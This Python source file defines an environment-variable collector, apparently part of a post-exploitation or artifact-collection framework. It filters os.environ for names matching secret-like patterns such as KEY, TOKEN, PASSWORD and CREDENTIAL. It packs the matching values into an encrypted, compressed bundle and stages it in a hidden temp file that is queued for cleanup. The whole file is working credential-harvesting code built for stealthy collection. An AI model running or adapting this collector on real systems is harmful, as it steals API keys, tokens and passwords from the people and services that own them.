
from __future__ import annotations

import json
import logging
import os
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

# Environment variable name patterns suggesting secret content
_SECRET_VAR_PATTERNS = (
    "KEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD",
    "CREDENTIAL", "AUTH", "API", "ACCESS", "PRIVATE",
)

class EnvVarCollector(BaseCollector):
    """
    Snapshot environment variables containing secret-like names/values.
    Filters os.environ for variable names matching _SECRET_VAR_PATTERNS.
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        sensitive = {
            k: v
            for k, v in os.environ.items()
            if any(pat in k.upper() for pat in _SECRET_VAR_PATTERNS)
        }

        if not sensitive:
            _LOG.debug("EnvVarCollector: no sensitive environment variables found.")
            return

        yield ArtifactMetadata(
            artifact_family="environment_variables",
            source_path="os.environ",
            source_platform=os.name,
            collection_method="api_call",
            report_safe_summary_fields={"variable_names": list(sensitive.keys())},
        )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        sensitive = {
            k: v
            for k, v in os.environ.items()
            if any(pat in k.upper() for pat in _SECRET_VAR_PATTERNS)
        }

        if not sensitive:
            return None

        bundle  = json.dumps({"source": "ENV_VARS", "vars": sensitive}, indent=2).encode()
        sha256  = self._sha256(bundle)
        payload = self._compress_and_encrypt(bundle)
        del bundle
        del sensitive

        stage_path = self._staging_dir / f".{sha256[:16]}.env.tmp"
        stage_path.write_bytes(payload)
        self._register_cleanup(stage_path)

        record = CollectedFile(
            path       = "ENV_VARS",
            sha256     = sha256,
            size_bytes = len(payload),
            metadata   = artifact,
        )
        self.persist_metadata(record)
        return record
